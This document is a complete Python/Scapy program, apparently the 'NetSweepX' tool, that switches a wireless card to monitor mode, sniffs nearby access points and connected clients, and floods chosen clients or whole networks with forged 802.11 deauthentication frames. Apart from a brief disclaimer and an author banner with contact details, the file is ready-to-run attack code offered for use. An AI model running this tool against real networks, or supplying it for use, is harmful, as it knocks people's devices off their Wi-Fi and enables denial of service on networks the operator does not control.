#!/usr/bin/env python3
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, conf
import os
import sys
import time
import signal
import platform
from threading import Thread, Event

# Global variables
access_points = {}
clients = {}
selected_interface = None
scanning_event = Event()  # Using Event for better thread synchronization
monitor_mode = False
is_windows = platform.system() == "Windows"

def signal_handler(sig, frame):
    global scanning_event
    scanning_event.clear()  # Signal threads to stop
    print("\n[*] Exiting...")
    if monitor_mode and selected_interface:
        disable_monitor_mode(selected_interface)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check_admin_privileges():
    if is_windows:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("This script must be run as administrator!")
            return False
    else:  # Linux/Unix/MacOS
        if os.geteuid() != 0:
            print("This script must be run as root!")
            return False
    return True

def enable_monitor_mode(interface):
    print(f"[*] Enabling monitor mode on {interface}")
    
    if is_windows:
        # Windows method using netsh (requires compatible wireless adapter)
        print("[!] Monitor mode on Windows requires compatible wireless adapter and drivers")
        print("[*] Attempting to enable monitor mode...")
        os.system(f"netsh wlan set hostednetwork mode=disallow")
        os.system(f"netsh interface set interface \"{interface}\" admin=disable")
        os.system(f"netsh interface set interface \"{interface}\" admin=enable")
        # Note: Windows may require third-party tools like Airpcap or specialized drivers
        return interface
    else:
        # Linux method
        os.system(f"ip link set {interface} down")
        os.system(f"iw dev {interface} set type monitor")
        os.system(f"ip link set {interface} up")
        return interface

def disable_monitor_mode(interface):
    print(f"[*] Disabling monitor mode on {interface}")
    
    if is_windows:
        # Windows method
        os.system(f"netsh interface set interface \"{interface}\" admin=disable")
        os.system(f"netsh interface set interface \"{interface}\" admin=enable")
    else:
        # Linux method
        os.system(f"ip link set {interface} down")
        os.system(f"iw dev {interface} set type managed")
        os.system(f"ip link set {interface} up")

def list_wireless_interfaces():
    interfaces = []
    
    if is_windows:
        # Windows method using netsh
        import subprocess
        try:
            output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode('utf-8', errors='replace')
            lines = output.split('\n')
            current_interface = None
            
            for line in lines:
                if "Name" in line and ":" in line:
                    current_interface = line.split(":", 1)[1].strip()
                    interfaces.append(current_interface)
        except subprocess.CalledProcessError:
            print("[!] Error retrieving wireless interfaces")
    else:
        # Linux method
        for iface in os.listdir('/sys/class/net/'):
            if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                interfaces.append(iface)
    
    return interfaces

def packet_handler(pkt):
    if not scanning_event.is_set():
        return
    
    # Check if packet has Dot11 layer
    if pkt.haslayer(Dot11):
        # Check if packet is a beacon frame (type 0, subtype 8)
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in access_points:
                try:
                    ssid = pkt.info.decode('utf-8', errors='replace') if pkt.info else "Hidden SSID"
                    access_points[pkt.addr2] = {"ssid": ssid, "channel": None, "clients": []}
                    # Use sys.stdout to prevent buffer issues
                    sys.stdout.write(f"[+] Discovered AP: {ssid} ({pkt.addr2})\n")
                    sys.stdout.flush()  # Force immediate output
                except Exception as e:
                    sys.stdout.write(f"[!] Error processing beacon: {e}\n")
                    sys.stdout.flush()
                
        # Check for devices connected to APs
        elif pkt.type == 2:  # Data frames
            try:
                if pkt.addr1 and pkt.addr2:  # Ensure addresses exist
                    if pkt.addr1 in access_points and pkt.addr2 not in access_points:
                        if pkt.addr2 not in access_points[pkt.addr1]["clients"]:
                            access_points[pkt.addr1]["clients"].append(pkt.addr2)
                            sys.stdout.write(f"[+] Found client {pkt.addr2} connected to {access_points[pkt.addr1]['ssid']}\n")
                            sys.stdout.flush()
                    elif pkt.addr2 in access_points and pkt.addr1 not in access_points:
                        if pkt.addr1 not in access_points[pkt.addr2]["clients"]:
                            access_points[pkt.addr2]["clients"].append(pkt.addr1)
                            sys.stdout.write(f"[+] Found client {pkt.addr1} connected to {access_points[pkt.addr2]['ssid']}\n")
                            sys.stdout.flush()
            except Exception as e:
                sys.stdout.write(f"[!] Error processing data frame: {e}\n")
                sys.stdout.flush()

def scan_networks(interface, scan_time=20):
    global scanning_event
    
    # Clear previous scan results
    access_points.clear()
    
    # Set scanning flag
    scanning_event.set()
    
    print(f"[*] Scanning for networks on {interface} for {scan_time} seconds...")
    print(f"[*] Please wait, results will appear as they are discovered...")
    
    try:
        # Start sniffing in a separate thread
        sniffer_thread = Thread(target=lambda: sniff(iface=interface, prn=packet_handler, store=0, timeout=scan_time))
        sniffer_thread.daemon = True
        sniffer_thread.start()
        
        # Progress indicator
        for i in range(scan_time):
            if not scanning_event.is_set():
                break
            sys.stdout.write(f"\r[*] Scanning... {i+1}/{scan_time} seconds elapsed ({len(access_points)} APs found)")
            sys.stdout.flush()
            time.sleep(1)
        
        # Clear scanning flag
        scanning_event.clear()
        
        # Wait for the sniffer thread to finish
        sniffer_thread.join(timeout=1)
        
        # Print final results
        print(f"\n\n[*] Scan completed! Found {len(access_points)} access points.")
    except Exception as e:
        print(f"\n[!] Error during scanning: {e}")
        if is_windows:
            print("[!] Note: Windows may have limited packet capture capabilities.")
            print("[!] Consider using a compatible external wireless adapter with appropriate drivers.")
        scanning_event.clear()

def perform_deauth_attack(router_mac, client_mac, interface, count=100, interval=0.1):
    print(f"\n[*] Starting deauthentication attack:")
    print(f"    Router: {router_mac}")
    print(f"    Client: {client_mac}")
    print(f"    Interface: {interface}")
    print(f"    Sending {count} packets with {interval}s interval")
    
    try:
        # Create deauthentication packet
        deauth_packet = RadioTap() / Dot11(addr1=client_mac, addr2=router_mac, addr3=router_mac) / Dot11Deauth(reason=7)
        
        # Send the packets
        print("[*] Sending deauthentication packets...")
        sendp(deauth_packet, iface=interface, count=count, inter=interval, verbose=1)
        print("[+] Attack completed!")
    except Exception as e:
        print(f"[!] Error during deauthentication attack: {e}")
        if is_windows:
            print("[!] Note: Packet injection on Windows requires compatible hardware and drivers.")
            print("[!] Standard Windows WiFi adapters typically don't support packet injection.")

def print_banner():
    os_type = "Windows" if is_windows else "Linux/Unix"
    
    banner = f"""
    ╔═══════════════════════════════════════════════╗
    ║                   NetSweepX                   ║
    ║     Network Scanner and Deauthentication      ║
    ║        Tool v1.2 (Open Source Edition)        ║
    ║                                               ║
    ║   Desined By : @Cyber_Squad6351               ║
    ║   Insta Id   : Cyber__Squad6351               ║
    ║   youTube    : Cyber_Squad6351                ║
    ║   Website    : cybersquad6351.netlify.app     ║
    ║   E-Mail     : mishraaditya.skm14@gmail.com   ║
    ║                                               ║
    ║   Note : "If U Find Any Error, Bug Or Want    ║
    ║   Help For Using This Tool, You Can Use Above ║
    ║   Information For Contacting Us."             ║ 
    ║                                               ║
    ║                                               ║
    ╚═══════════════════════════════════════════════╝
    """
    print(banner)
    print("⚠️  LEGAL DISCLAIMER:")
    print("This tool is for educational purposes and authorized penetration testing only.")
    print("Use only on networks you own or have explicit permission to test.\n")
    print("Team @Cyber_Squad6351 Is Not Responsible For Anything Happens Use At Your Own Risk.\n")
    
    if is_windows:
        print("⚠️  WINDOWS COMPATIBILITY NOTICE:")
        print("Full functionality requires specialized hardware and drivers.")
        print("Standard Windows WiFi adapters have limited monitor mode and packet injection support.\n")

def main_menu():
    global selected_interface, monitor_mode
    
    if not check_admin_privileges():
        input("Press Enter to exit...")
        sys.exit(1)
    
    print_banner()
    
    while True:
        print("\n=== MAIN MENU ===")
        print("1. Select Wireless Interface")
        print("2. Enable Monitor Mode")
        print("3. Scan for Networks")
        print("4. List Discovered Networks")
        print("5. Perform Deauthentication Attack")
        print("6. Disable Monitor Mode")
        print("7. Exit")
        
        choice = input("\nEnter your choice [1-7]: ")
        
        if choice == "1":
            interfaces = list_wireless_interfaces()
            if not interfaces:
                print("[!] No wireless interfaces found!")
                continue
                
            print("\nAvailable Wireless Interfaces:")
            for i, iface in enumerate(interfaces, 1):
                print(f"{i}. {iface}")
            
            try:
                idx = int(input("\nSelect interface number: ")) - 1
                if 0 <= idx < len(interfaces):
                    selected_interface = interfaces[idx]
                    print(f"[+] Selected interface: {selected_interface}")
                else:
                    print("[!] Invalid selection!")
            except ValueError:
                print("[!] Please enter a valid number!")
        
        elif choice == "2":
            if not selected_interface:
                print("[!] Please select an interface first!")
                continue
                
            selected_interface = enable_monitor_mode(selected_interface)
            monitor_mode = True
            print(f"[+] Monitor mode enabled on {selected_interface}")
            
            if is_windows:
                print("[!] Note: Monitor mode support on Windows varies by adapter and driver.")
                print("[!] Functionality may be limited with standard WiFi adapters.")
        
        elif choice == "3":
            if not selected_interface:
                print("[!] Please select an interface first!")
                continue
                
            if not monitor_mode:
                print("[!] Enable monitor mode first!")
                continue
                
            scan_time = input("Enter scan duration in seconds [default: 30]: ")
            try:
                scan_time = int(scan_time) if scan_time else 30
            except ValueError:
                scan_time = 30
                print("[!] Invalid input, using default of 30 seconds")
                
            scan_networks(selected_interface, scan_time)
        
        elif choice == "4":
            if not access_points:
                print("[!] No networks discovered yet!")
                continue
                
            print("\n=== DISCOVERED NETWORKS ===")
            for i, (mac, ap_info) in enumerate(access_points.items(), 1):
                client_count = len(ap_info["clients"])
                print(f"{i}. SSID: {ap_info['ssid']} | MAC: {mac} | Connected Clients: {client_count}")
                
                if client_count > 0:
                    print("   Connected Clients:")
                    for j, client in enumerate(ap_info["clients"], 1):
                        print(f"   {j}. {client}")
            
            # Wait for user to review the networks
            input("\nPress Enter to continue...")
        
        elif choice == "5":
            if not selected_interface:
                print("[!] Please select an interface first!")
                continue
                
            if not monitor_mode:
                print("[!] Enable monitor mode first!")
                continue
                
            if not access_points:
                print("[!] No networks discovered yet!")
                continue
                
            print("\nSelect a network to attack:")
            ap_list = list(access_points.items())
            for i, (mac, ap_info) in enumerate(ap_list, 1):
                print(f"{i}. {ap_info['ssid']} ({mac}) - {len(ap_info['clients'])} clients")
            
            try:
                ap_idx = int(input("\nSelect network number: ")) - 1
                if not (0 <= ap_idx < len(ap_list)):
                    print("[!] Invalid selection!")
                    continue
                    
                router_mac = ap_list[ap_idx][0]
                ap_info = ap_list[ap_idx][1]
                
                if not ap_info["clients"]:
                    broadcast_attack = input("[!] No clients detected. Perform broadcast deauth? (y/n): ").lower()
                    if broadcast_attack == "y":
                        client_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast address
                    else:
                        continue
                else:
                    print("\nSelect a client to deauthenticate:")
                    print("0. All clients (broadcast)")
                    for i, client in enumerate(ap_info["clients"], 1):
                        print(f"{i}. {client}")
                    
                    client_idx = int(input("\nSelect client number: "))
                    if client_idx == 0:
                        client_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast address
                    elif 1 <= client_idx <= len(ap_info["clients"]):
                        client_mac = ap_info["clients"][client_idx - 1]
                    else:
                        print("[!] Invalid selection!")
                        continue
                
                count = input("Number of deauth packets to send [default: 100]: ")
                try:
                    count = int(count) if count else 100
                except ValueError:
                    count = 100
                    print("[!] Invalid input, using default of 100 packets")
                
                interval = input("Interval between packets in seconds [default: 0.1]: ")
                try:
                    interval = float(interval) if interval else 0.1
                except ValueError:
                    interval = 0.1
                    print("[!] Invalid input, using default of 0.1 seconds")
                
                perform_deauth_attack(router_mac, client_mac, selected_interface, count, interval)
                
            except ValueError:
                print("[!] Please enter a valid number!")
        
        elif choice == "6":
            if not selected_interface:
                print("[!] No interface in monitor mode!")
                continue
                
            if not monitor_mode:
                print("[!] Interface is not in monitor mode!")
                continue
                
            disable_monitor_mode(selected_interface)
            monitor_mode = False
        
        elif choice == "7":
            if monitor_mode and selected_interface:
                disable_monitor_mode(selected_interface)
            print("[*] Exiting...")
            break
        
        else:
            print("[!] Invalid choice!")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n[*] Keyboard interrupt detected")
        if monitor_mode and selected_interface:
            disable_monitor_mode(selected_interface)
        print("[*] Exiting...")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
        if monitor_mode and selected_interface:
            try:
                disable_monitor_mode(selected_interface)
            except:
                pass
        input("Press Enter to exit...")